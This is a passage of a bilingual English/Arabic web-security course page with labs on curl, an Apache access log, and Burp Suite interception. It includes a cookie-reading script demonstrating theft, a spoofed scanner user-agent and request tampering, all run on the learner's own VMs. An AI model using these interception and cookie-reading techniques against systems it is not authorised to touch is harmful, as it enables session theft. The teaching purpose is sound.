+<p>Recreate the document request from Lab 7.1 without a browser:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>https://example.com/<span class="w"> </span>-o<span class="w"> </span>/tmp/page.html
+</code></pre></div>
+   <code>-v</code> makes curl print the request it sent <strong>and</strong> the response headers. Lines starting with <code>&gt;</code> are what curl sent; <code>&lt;</code> is what the server sent. Read both fully.</p>
+</li>
+<li>
+<p>Add headers yourself and watch the server change its answer:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;MentorBot/1.0&quot;</span><span class="w"> </span>https://example.com/
+curl<span class="w"> </span>-v<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;https://google.com&quot;</span><span class="w"> </span>https://example.com/
+</code></pre></div></p>
+</li>
+<li>
+<p>Follow a redirect manually and observe the <code>3xx</code> chain:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>http://example.com/<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^&lt; HTTP|^&lt; Location&quot;</span>
+</code></pre></div>
+   Then add <code>-L</code> and see curl follow it for you.</p>
+</li>
+<li>
+<p>Make a <code>POST</code> with a body and a content type:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://httpbin.org/post<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;user&quot;:&quot;analyst&quot;,&quot;role&quot;:&quot;viewer&quot;}&#39;</span>
+</code></pre></div>
+   Read the JSON echo. This is exactly what a browser does when you submit a form — nothing more.</p>
+</li>
+<li>
+<p>Compare: in DevTools, right-click the document request → <strong>Copy as cURL</strong>. Paste it into Kali and run it. You have just replayed a browser request from the command line.</p>
+</li>
+</ol>
+<p><strong>Expected output:</strong> A <code>curl -v</code> transcript you can annotate line by line, plus a working replayed request copied from the browser.</p>
+<p><strong>If you see this → it means:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Cause</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl: (60) SSL certificate problem</code></td>
+<td>Use <code>-k</code> <strong>only</strong> in the lab, and note why disabling certificate validation is a real-world attack (Week 6)</td>
+</tr>
+<tr>
+<td>Nothing prints until the whole response arrives</td>
+<td><code>-v</code> writes to stderr — add <code>2&gt;&amp;1</code> when piping</td>
+</tr>
+<tr>
+<td><code>Host</code> header rejected / default site served</td>
+<td>The server routes by <code>Host</code>; without it you hit the default vhost</td>
+</tr>
+<tr>
+<td>Replayed <code>curl</code> returns a login page instead of content</td>
+<td>Your session cookie wasn't included — add <code>-b "session=..."</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3>Lab 7.3 — Your own web server and its access log (1.5h)</h3>
+<p><strong>Goal:</strong> Own both ends of the conversation.</p>
+<p><strong>Setup:</strong> Ubuntu VM.</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Install Apache: <code>sudo apt update &amp;&amp; sudo apt install -y apache2</code>. Confirm <code>http://localhost/</code> serves the default page.</li>
+<li>Find the config: <code>ls /etc/apache2/</code>. Open <code>sites-available/000-default.conf</code> and identify <code>DocumentRoot</code>, the <code>Listen</code> port, and the log directives.</li>
+<li>Create your own page at <code>/var/www/html/lab.html</code> with a title, a heading, and a link. Reload it in the browser.</li>
+<li>
+<p>Watch the log live in a second terminal:
+   <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>tail<span class="w"> </span>-f<span class="w"> </span>/var/log/apache2/access.log
+</code></pre></div>
+   Now hit the page from Kali's browser at <code>http://&lt;ubuntu-ip&gt;/lab.html</code>. Read the new line and identify every field.</p>
+</li>
+<li>
+<p><strong>Produce one entry of each kind</strong> while the log tails: a normal <code>200</code>, a <code>404</code> (request a path that doesn't exist), and a <code>304</code> (reload the page you already have cached).</p>
+</li>
+<li>
+<p>Add a deliberately odd request and find it later:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;Nmap Scripting Engine&quot;</span><span class="w"> </span><span class="s2">&quot;http://&lt;ubuntu-ip&gt;/admin&quot;</span>
+</code></pre></div>
+   Find it in the log. This is what a scanner looks like from the server's side.</p>
+</li>
+<li>
+<p>Open <code>error.log</code> too. Note the difference: access log = <em>who asked for what</em>; error log = <em>what went wrong</em>.</p>
+</li>
+</ol>
+<p><strong>Expected output:</strong> <code>/var/log/apache2/access.log</code> containing your <code>200</code>, your <code>404</code>, your <code>304</code>, and your scanner user-agent — with each field explained in your notes.</p>
+<p><strong>If you see this → it means:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Cause</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kali can't reach <code>http://&lt;ubuntu-ip&gt;/</code></td>
+<td>Apache not started, or <code>ufw</code> blocking port 80 — <code>sudo systemctl status apache2</code>, <code>sudo ufw allow 80</code></td>
+</tr>
+<tr>
+<td>Log lines have <code>-</code> for the username field</td>
+<td>Normal: the request was unauthenticated. <strong>That field is only populated by HTTP auth, not by your app's login</strong> — a classic beginner misunderstanding</td>
+</tr>
+<tr>
+<td>Nothing appears in <code>access.log</code></td>
+<td>You're tailing the wrong vhost's log, or the request never arrived (check <code>error.log</code>)</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Lab 7.4 — Burp Suite as a proxy, and breaking a cookie (2.5h)</h3>
+<p><strong>Goal:</strong> Put yourself between the browser and the server — then prove why cookie flags exist.</p>
+<p><strong>Setup:</strong> Kali VM. Burp Suite Community is preinstalled (also available from <a href="https://portswigger.net/burp/communitydownload">portswigger.net/burp/communitydownload</a>).</p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Launch Burp → <strong>Temporary project</strong> → <strong>Use Burp defaults</strong>. Read the <a href="https://portswigger.net/burp/documentation/desktop/getting-started">getting-started guide</a>.</li>
+<li>In <strong>Proxy → Proxy settings</strong>, confirm the listener is <code>127.0.0.1:8080</code>.</li>
+<li>Point your <strong>Kali browser</strong> at the proxy (Firefox: Settings → Network Settings → Manual proxy → <code>127.0.0.1:8080</code>). Confirm traffic appears in <strong>Proxy → HTTP history</strong>.</li>
+<li>Turn <strong>Intercept on</strong> (<code>Proxy → Intercept → Intercept is on</code>). Browse to <code>http://&lt;ubuntu-ip&gt;/lab.html</code>. The request is now frozen in your hands. Read it. Then <strong>change the <code>User-Agent</code></strong> and forward it. Confirm the change survives.</li>
+<li>Send a request to <strong>Repeater</strong> (<code>Ctrl+R</code>), and from Repeater resend it five times, editing one thing each time: the path, the <code>Referer</code>, a query parameter, a cookie value. You are now doing manually what a scanner automates.</li>
+<li>
+<p><strong>Now break the cookie.</strong> On the Ubuntu VM, create <code>/var/www/html/cookie.html</code>:
+   <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Cookie lab<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;JS can see: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+   Load it. Then in the browser console on that page run
+   <code>document.cookie = "session=SECRET123; path=/"</code> and reload. <strong>The value is printed on the page</strong> — that is exactly what theft looks like.</p>
+</li>
+<li>
+<p>Now do it with the flag set. JavaScript <strong>cannot</strong> set <code>HttpOnly</code> — that is the point: only the server can, via a <code>Set-Cookie</code> response header. So first delete the step-6 cookie (DevTools → <strong>Storage → Cookies → <code>http://&lt;ubuntu-ip&gt;</code> → right-click → Delete</strong>), then add a cookie named <code>session</code> with value <code>SECRET123</code> and tick <strong>HttpOnly</strong> (a real server would send <code>Set-Cookie: session=SECRET123; HttpOnly</code>). Reload the page: the value no longer appears. Confirm in Storage that the cookie still exists — the browser still sends it to the server on every request; JavaScript simply cannot read it.</p>
+</li>
+<li>Write up: <em>if an attacker could run one line of JavaScript on this page, which cookie would they get, and which one would they be locked out of?</em></li>
+</ol>
+<blockquote>
+<p>⚠️ Steps 6–7 are done on <strong>your own local page, on your own VM</strong>. Modifying a cookie on a system you do not own is not an exercise, it is an intrusion.</p>
+</blockquote>
+<p><strong>Expected output:</strong> A Burp HTTP history containing at least five requests you edited, plus two screenshots: one cookie value visible from JavaScript, the same value invisible under <code>HttpOnly</code>.</p>
+<p><strong>If you see this → it means:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Cause</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Browser shows "connection refused" after proxy setup</td>
+<td>Burp not running, or the listener is on a different port</td>
+</tr>
+<tr>
+<td>HTTPS sites fail with certificate warnings</td>
+<td>Expected — Burp is MITM-ing your own traffic with its own CA. For Community Edition, stick to <code>http://</code> lab targets</td>
+</tr>
+<tr>
+<td>Intercept is on but nothing stops</td>
+<td>Intercept filters are excluding it, or the response came from browser cache</td>
+</tr>
+<tr>
+<td><code>document.cookie</code> returns nothing for the cookie you expect</td>
+<td>The cookie's <code>Path</code> doesn't match the page path, or it is <code>HttpOnly</code> (which is the answer you want in step 7)</td>
+</tr>
+</tbody>
+</table></div></div>
+    <div class="prose only-ar" dir="rtl" lang="ar"><p>كل ما يلي يعمل داخل VirtualBox. مختبرات المتصفح تُنفَّذ على آلة <strong>Ubuntu</strong> الوهمية؛ أما <code>curl</code> و Burp فيُشغَّلان من <strong>Kali</strong>. تبقى الآلتان على شبكة NAT Network من الأسبوع 1.</p>
+<h3>المختبر 7.1 — اقرأ ما يجري على السلك باستخدام DevTools (1.5 ساعة)</h3>
+<p><strong>الهدف:</strong> أن ترى أن صفحة الويب ليست شيئاً واحداً — بل نصّ محادثة.</p>
+<p><strong>التهيئة:</strong> آلة Ubuntu الوهمية، Firefox أو Chromium، أي موقع. افتح DevTools (<code>F12</code>) → تبويب <strong>Network</strong>. فعّل خيار "Persist Logs".</p>
+<p><strong>الخطوات:</strong></p>
+<ol>
+<li>امسح السجل، ثم حمّل صفحة واحدة. يجب أن ترى عشرات الطلبات، لا طلباً واحداً. رتّب حسب الحجم. أي طلب هو مستند HTML؟</li>
+<li>انقر على الطلب <strong>الأول</strong> (المستند). اقرأ بهذا الترتيب: سطر الطلب (<code>GET /path HTTP/1.1</code>)، ثم لوحة <strong>Headers</strong> → Request Headers، ثم Response Headers، ثم تبويب <strong>Response</strong>.</li>
+<li>اكتب بخط يدك: عنوان URL، والطريقة، و <code>Host</code> و <code>User-Agent</code> و <code>Referer</code> و <code>Accept</code>، ورمز حالة الاستجابة، و <code>Content-Type</code> و <code>Content-Length</code>، وكل ترويسة <code>Set-Cookie</code>.</li>
+<li>جد صورة، وملف CSS، وملف JS في القائمة. قارن قيم <code>Content-Type</code> لديها.</li>
+<li>أعد تحميل الصفحة. جد التحميل الثاني لملف CSS — لاحظ رمز الحالة (<code>304</code>) واشرح في ملاحظاتك ما الذي تجنّب المتصفح تنزيله.</li>
+<li>اذهب إلى <strong>Storage</strong> → Cookies. جد كوكي الجلسة. سجّل كل سمة: الاسم، القيمة، <code>HttpOnly</code>، <code>Secure</code>، <code>SameSite</code>، <code>Path</code>، <code>Expires</code>.</li>
+<li>افتح <strong>Console</strong>. نفّذ <code>document.cookie</code> وسجّل ما تراه. ثم قارنه بقائمة الكوكيز من الخطوة 6.</li>
+</ol>
+<p><strong>المخرج المطلوب:</strong> جدول مكتوب بخط اليد فيه 8–10 من ترويسات الطلب/الاستجابة تستطيع شرحها، وكوكي جلسة تستطيع تسمية سماته.</p>
+<p><strong>إذا رأيت هذا → فهذا معناه:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>العَرَض</th>
+<th>السبب</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>تبويب Network فارغ عند التحميل</td>
+<td>فُتح DevTools <em>بعد</em> تحميل الصفحة — أعد التحميل وهو مفتوح</td>
+</tr>
+<tr>
+<td><code>document.cookie</code> يعرض أقل من لوحة Storage</td>
+<td>ذلك الكوكي <code>HttpOnly</code> — مخفي عن الجافاسكربت عن قصد. <strong>وهذا هو جوهر هذه السمة بالكامل</strong></td>
+</tr>
+<tr>
+<td>كل شيء تقريباً <code>200</code> من الذاكرة المؤقتة</td>
+<td>فعّل خيار تعطيل الذاكرة المؤقتة (Disable cache)، أو استخدم <code>Ctrl+Shift+R</code></td>
+</tr>
+<tr>
+<td>الحالة تعرض <code>(from disk cache)</code></td>
+<td>ليس طلب شبكة إطلاقاً — المتصفح أجاب محلياً</td>
+</tr>
+</tbody>
+</table></div>
+<h3>المختبر 7.2 — الطلبات نفسها، يدوياً، باستخدام curl (1.5 ساعة)</h3>
+<p><strong>الهدف:</strong> أثبت أن المتصفح وسيلة راحة، وليس شرطاً.</p>
+<p><strong>التهيئة:</strong> آلة Kali الوهمية. <code>curl</code> مثبَّت مسبقاً.</p>
+<p><strong>الخطوات:</strong></p>
+<ol>
+<li>
+<p>أعد إنشاء طلب المستند من المختبر 7.1 بدون متصفح:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>https://example.com/<span class="w"> </span>-o<span class="w"> </span>/tmp/page.html
+</code></pre></div>
+   <code>-v</code> تجعل curl يطبع الطلب الذي أرسله <strong>و</strong> ترويسات الاستجابة. الأسطر التي تبدأ بـ <code>&gt;</code> هي ما أرسله curl؛ و <code>&lt;</code> هو ما أرسله السيرفر. اقرأ الاثنين كاملين.</p>
+</li>
+<li>
+<p>أضف ترويسات بنفسك وشاهد السيرفر يغيّر جوابه:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;MentorBot/1.0&quot;</span><span class="w"> </span>https://example.com/
+curl<span class="w"> </span>-v<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;https://google.com&quot;</span><span class="w"> </span>https://example.com/
+</code></pre></div></p>
+</li>
+<li>
+<p>تتبّع إعادة توجيه يدوياً ولاحظ سلسلة <code>3xx</code>:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>http://example.com/<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^&lt; HTTP|^&lt; Location&quot;</span>
+</code></pre></div>
+   ثم أضف <code>-L</code> وشاهد curl يتبعه نيابة عنك.</p>
+</li>
+<li>
+<p>نفّذ طلب <code>POST</code> بجسم ونوع محتوى:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-v<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://httpbin.org/post<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;user&quot;:&quot;analyst&quot;,&quot;role&quot;:&quot;viewer&quot;}&#39;</span>
+</code></pre></div>
+   اقرأ صدى JSON. هذا بالضبط ما يفعله المتصفح عند إرسال نموذج — لا أكثر.</p>
+</li>
+<li>
+<p>قارن: في DevTools، انقر بزر الفأرة الأيمن على طلب المستند → <strong>Copy as cURL</strong>. الصقه في Kali ونفّذه. لقد أعدت للتوّ تشغيل طلب متصفح من سطر الأوامر.</p>
+</li>
+</ol>
+<p><strong>المخرج المطلوب:</strong> نصّ <code>curl -v</code> كامل تستطيع التعليق عليه سطراً بسطر، بالإضافة إلى طلب مُعاد تشغيله بنجاح ومنسوخ من المتصفح.</p>
+<p><strong>إذا رأيت هذا → فهذا معناه:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>العَرَض</th>
+<th>السبب</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>curl: (60) SSL certificate problem</code></td>
+<td>استخدم <code>-k</code> <strong>في المختبر فقط</strong>، وسجّل لماذا يُعدّ تعطيل التحقق من الشهادة هجوماً واقعياً (الأسبوع 6)</td>
+</tr>
+<tr>
+<td>لا يُطبع شيء حتى تصل الاستجابة كاملة</td>
+<td><code>-v</code> يكتب إلى stderr — أضف <code>2&gt;&amp;1</code> عند التمرير عبر أنبوب</td>
+</tr>
+<tr>
+<td>ترويسة <code>Host</code> مرفوضة / يُخدَم الموقع الافتراضي</td>
+<td>السيرفر يوجّه حسب <code>Host</code>؛ بدونها تصطدم بالمضيف الافتراضي (default vhost)</td>
+</tr>
+<tr>
+<td><code>curl</code> المُعاد تشغيله يعيد صفحة تسجيل دخول بدل المحتوى</td>
+<td>كوكي جلستك لم يُضمَّن — أضف <code>-b "session=..."</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3>المختبر 7.3 — خادم الويب الخاص بك وسجل الوصول (1.5 ساعة)</h3>
+<p><strong>الهدف:</strong> امتلك طرفي المحادثة.</p>
+<p><strong>التهيئة:</strong> آلة Ubuntu الوهمية.</p>
+<p><strong>الخطوات:</strong></p>
+<ol>
+<li>ثبّت Apache: <code>sudo apt update &amp;&amp; sudo apt install -y apache2</code>. تأكد أن <code>http://localhost/</code> يخدم الصفحة الافتراضية.</li>
+<li>جد الإعدادات: <code>ls /etc/apache2/</code>. افتح <code>sites-available/000-default.conf</code> وحدّد <code>DocumentRoot</code>، ومنفذ <code>Listen</code>، وتوجيهات السجلات.</li>
+<li>أنشئ صفحتك الخاصة في <code>/var/www/html/lab.html</code> بعنوان وترويسة ورابط. أعد تحميلها في المتصفح.</li>
+<li>
+<p>راقب السجل مباشرةً في طرفية ثانية:
+   <div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>tail<span class="w"> </span>-f<span class="w"> </span>/var/log/apache2/access.log
+</code></pre></div>
+   الآن اطلب الصفحة من متصفح Kali على <code>http://&lt;ubuntu-ip&gt;/lab.html</code>. اقرأ السطر الجديد وحدّد كل حقل فيه.</p>
+</li>
+<li>
+<p><strong>أنتج سطراً من كل نوع</strong> بينما السجل يُتابع مباشرة: <code>200</code> عادي، و <code>404</code> (اطلب مساراً غير موجود)، و <code>304</code> (أعد تحميل الصفحة المخزّنة لديك مسبقاً).</p>
+</li>
+<li>
+<p>أضف طلباً غريباً عن قصد ثم جده لاحقاً:
+   <div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;Nmap Scripting Engine&quot;</span><span class="w"> </span><span class="s2">&quot;http://&lt;ubuntu-ip&gt;/admin&quot;</span>
+</code></pre></div>
+   جده في السجل. هكذا يبدو الماسح من جهة السيرفر.</p>
+</li>
+<li>
+<p>افتح <code>error.log</code> أيضاً. لاحظ الفرق: سجل الوصول = <em>مَن طلب ماذا</em>؛ سجل الأخطاء = <em>ما الذي أخفق</em>.</p>
+</li>
+</ol>
+<p><strong>المخرج المطلوب:</strong> <code>/var/log/apache2/access.log</code> يحتوي على <code>200</code> و <code>404</code> و <code>304</code> الخاصة بك، ووكيل المستخدم الخاص بالماسح — مع شرح كل حقل في ملاحظاتك.</p>
+<p><strong>إذا رأيت هذا → فهذا معناه:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>العَرَض</th>
+<th>السبب</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kali لا تستطيع الوصول إلى <code>http://&lt;ubuntu-ip&gt;/</code></td>
+<td>Apache غير مُشغَّل، أو <code>ufw</code> يحجب المنفذ 80 — <code>sudo systemctl status apache2</code>، <code>sudo ufw allow 80</code></td>
+</tr>
+<tr>
+<td>أسطر السجل فيها <code>-</code> في حقل اسم المستخدم</td>
+<td>طبيعي: الطلب غير مُصادَق. <strong>هذا الحقل لا يُملأ إلا بمصادقة HTTP، وليس بتسجيل الدخول في تطبيقك</strong> — سوء فهم كلاسيكي لدى المبتدئين</td>
+</tr>
+<tr>
+<td>لا يظهر شيء في <code>access.log</code></td>
+<td>أنت تتابع سجل المضيف الافتراضي الخطأ، أو أن الطلب لم يصل أصلاً (تحقق من <code>error.log</code>)</td>
+</tr>
+</tbody>
+</table></div>
+<h3>المختبر 7.4 — Burp Suite كوسيط، وكسر كوكي (2.5 ساعة)</h3>
+<p><strong>الهدف:</strong> ضع نفسك بين المتصفح والسيرفر — ثم أثبت لماذا توجد سمات الكوكي.</p>
+<p><strong>التهيئة:</strong> آلة Kali الوهمية. Burp Suite Community مثبَّت مسبقاً (متاح أيضاً من <a href="https://portswigger.net/burp/communitydownload">portswigger.net/burp/communitydownload</a>).</p>
+<p><strong>الخطوات:</strong></p>
+<ol>
+<li>شغّل Burp → <strong>Temporary project</strong> → <strong>Use Burp defaults</strong>. اقرأ <a href="https://portswigger.net/burp/documentation/desktop/getting-started">دليل البدء</a>.</li>
+<li>في <strong>Proxy → Proxy settings</strong>، تأكد أن المستمع (listener) على <code>127.0.0.1:8080</code>.</li>
+<li>وجّه <strong>متصفح Kali</strong> إلى الوسيط (Firefox: Settings → Network Settings → Manual proxy → <code>127.0.0.1:8080</code>). تأكد أن الحركة تظهر في <strong>Proxy → HTTP history</strong>.</li>
+<li>شغّل <strong>Intercept</strong> (<code>Proxy → Intercept → Intercept is on</code>). تصفّح إلى <code>http://&lt;ubuntu-ip&gt;/lab.html</code>. الطلب الآن مجمّد بين يديك. اقرأه. ثم <strong>غيّر <code>User-Agent</code></strong> ومرّره (Forward). تأكد أن التغيير وصل.</li>
+<li>أرسل طلباً إلى <strong>Repeater</strong> (<code>Ctrl+R</code>)، ثم أعد إرساله من Repeater خمس مرات، وعدّل شيئاً واحداً في كل مرة: المسار، و <code>Referer</code>، ومعامل استعلام (query parameter)، وقيمة كوكي. أنت الآن تفعل يدوياً ما يؤتمته الماسح.</li>
+<li>
+<p><strong>الآن اكسر الكوكي.</strong> على آلة Ubuntu الوهمية، أنشئ <code>/var/www/html/cookie.html</code>:
+   <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Cookie lab<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;JS can see: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+   حمّلها. ثم في طرفية المتصفح (console) على تلك الصفحة نفّذ
+   <code>document.cookie = "session=SECRET123; path=/"</code> وأعد التحميل. <strong>القيمة تُطبع على الصفحة</strong> — هكذا تبدو السرقة بالضبط.</p>
+</li>
+<li>
+<p>الآن افعلها والسمة مضبوطة. الجافاسكربت <strong>لا يستطيع</strong> ضبط <code>HttpOnly</code> — وهذا هو المقصد: السيرفر وحده يستطيع، عبر ترويسة استجابة <code>Set-Cookie</code>. لذا احذف أولاً كوكي الخطوة 6 (DevTools → <strong>Storage → Cookies → <code>http://&lt;ubuntu-ip&gt;</code> → زر الفأرة الأيمن → Delete</strong>)، ثم أضف كوكياً باسم <code>session</code> وقيمته <code>SECRET123</code> وفعّل <strong>HttpOnly</strong> (السيرفر الحقيقي كان سيرسل <code>Set-Cookie: session=SECRET123; HttpOnly</code>). أعد تحميل الصفحة: القيمة لم تعد تظهر. تأكد في Storage أن الكوكي ما زال موجوداً — فالمتصفح ما زال يرسله إلى السيرفر مع كل طلب؛ لكن الجافاسكربت ببساطة لا يستطيع قراءته.</p>
+</li>
+<li>اكتب: <em>لو استطاع مهاجم تنفيذ سطر جافاسكربت واحد على هذه الصفحة، أي كوكي سيحصل عليه، وأي كوكي سيُحرَم منه؟</em></li>
+</ol>
+<blockquote>
+<p>⚠️ الخطوتان 6–7 تُنفَّذان على <strong>صفحتك المحلية، على آلتك الوهمية</strong>. تعديل كوكي على نظام لا تملكه ليس تمريناً، بل هو اختراق.</p>
+</blockquote>
+<p><strong>المخرج المطلوب:</strong> سجل HTTP history في Burp يحتوي خمسة طلبات عدّلتها على الأقل، بالإضافة إلى لقطتي شاشة: قيمة كوكي ظاهرة من الجافاسكربت، والقيمة نفسها غير ظاهرة تحت <code>HttpOnly</code>.</p>
+<p><strong>إذا رأيت هذا → فهذا معناه:</strong></p>
+<div class="tablewrap"><table>
+<thead>
+<tr>
+<th>العَرَض</th>
+<th>السبب</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>المتصفح يعرض "connection refused" بعد إعداد الوسيط</td>
+<td>Burp غير مُشغَّل، أو أن المستمع على منفذ آخر</td>
+</tr>
+<tr>
+<td>مواقع HTTPS تفشل بتحذيرات شهادات</td>
+<td>متوقع — Burp يعترض حركتك أنت بشهادته الخاصة (MITM). في إصدار Community، التزم بأهداف مختبر من نوع <code>http://</code></td>
+</tr>
+<tr>
+<td>Intercept مُشغَّل لكن لا شيء يتوقف</td>
+<td>فلاتر Intercept تستثنيه، أو أن الاستجابة جاءت من ذاكرة المتصفح المؤقتة</td>
+</tr>
+<tr>
+<td><code>document.cookie</code> لا يعيد شيئاً للكوكي الذي تتوقعه</td>
+<td>قيمة <code>Path</code> في الكوكي لا تطابق مسار الصفحة، أو أنه <code>HttpOnly</code> (وهذا هو الجواب المطلوب في الخطوة 7)</td>
+</tr>
+</tbody>
+</table></div></div>
+  </div>
+</details><details class="lesson-sec" id="challenge" data-sec="challenge" open>
+  <summary class="lesson-sec-head">
+    <span class="lesson-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/></svg></span>
+    <span class="lesson-titles">
+      <h2><span class="only-en">Challenge</span><span class="only-ar">التحدّي</span></h2>
+      <span class="lesson-sub"><span><span class="only-en">≈5h · Unguided — this is where it sticks</span><span class="only-ar">≈5ساعات · بدون إرشاد — هنا يحدث التعلّم الحقيقي</span></span></span>
+    </span>
+    <button class="done-toggle" type="button" data-done aria-pressed="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg><span><span class="only-en">Mark complete</span><span class="only-ar">علّم كمكتمل</span></span></button>
+    <svg class="chev" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
+  </summary>
+  <div class="lesson-sec-body">
+    <div class="prose only-en"><ul>
+<li><strong>OverTheWire Natas, levels 0–10</strong> — <a href="https://overthewire.org/wargames/natas/">overthewire.org/wargames/natas</a>. This is a <em>browser-based</em> wargame: no SSH, just a URL, a username, and a password per level. You start at <code>natas0</code> / <code>natas0</code>. Everything you learned today — view-source, cookies, headers, <code>curl</code>, a proxy — is the solution to these levels. <strong>This is the ideal wargame for Weeks 7 and 8.</strong></li>
+<li><strong>PortSwigger Academy</strong> — <a href="https://portswigger.net/web-security/information-disclosure">Information disclosure</a>. Read the topic, then solve every <em>apprentice</em> lab. These labs run in your browser on PortSwigger's own servers, so they cost nothing, need no VM, and are unambiguously authorized.</li>
+<li>Write <code>headercheck.sh</code> — takes a URL, fetches only the response headers with <code>curl -sI</code>, and prints a report flagging: missing <code>Strict-Transport-Security</code>, missing <code>Content-Security-Policy</code>, and any <code>Set-Cookie</code> <strong>lacking</strong> <code>HttpOnly</code>, <code>Secure</code>, or <code>SameSite</code>.</li>
+<li>Answer in writing: <em>a proxy sits between you and the server. What can it see, and what can it change?</em> Then answer the harder half: <em>which of those changes stop working the moment the connection is HTTPS, and why?</em></li>
+</ul>
+<blockquote>
+<p><strong>Rule for Natas:</strong> do not look up solutions. If you are stuck for more than 45 minutes, write down the exact question you are asking, take a break, and come back. A hint costs you the entire level.</p>
+</blockquote></div>
+    <div class="prose only-ar" dir="rtl" lang="ar"><ul>
+<li><strong>OverTheWire Natas، المستويات 0–10</strong> — <a href="https://overthewire.org/wargames/natas/">overthewire.org/wargames/natas</a>. هذه لعبة تدريبية <em>قائمة على المتصفح</em>: لا SSH، فقط عنوان URL واسم مستخدم وكلمة مرور لكل مستوى. تبدأ من <code>natas0</code> / <code>natas0</code>. كل ما تعلّمته اليوم — عرض المصدر (view-source)، والكوكيز، والترويسات، و <code>curl</code>، والوسيط — هو حل هذه المستويات. <strong>هذه هي اللعبة التدريبية المثالية للأسبوعين 7 و 8.</strong></li>
+<li><strong>PortSwigger Academy</strong> — <a href="https://portswigger.net/web-security/information-disclosure">كشف المعلومات</a>. اقرأ الموضوع، ثم حُلّ كل مختبر من فئة <em>apprentice</em>. هذه المختبرات تعمل في متصفحك على سيرفرات PortSwigger نفسها، فلا تكلف شيئاً، ولا تحتاج آلة وهمية، وهي مُصرَّح بها بلا لبس.</li>
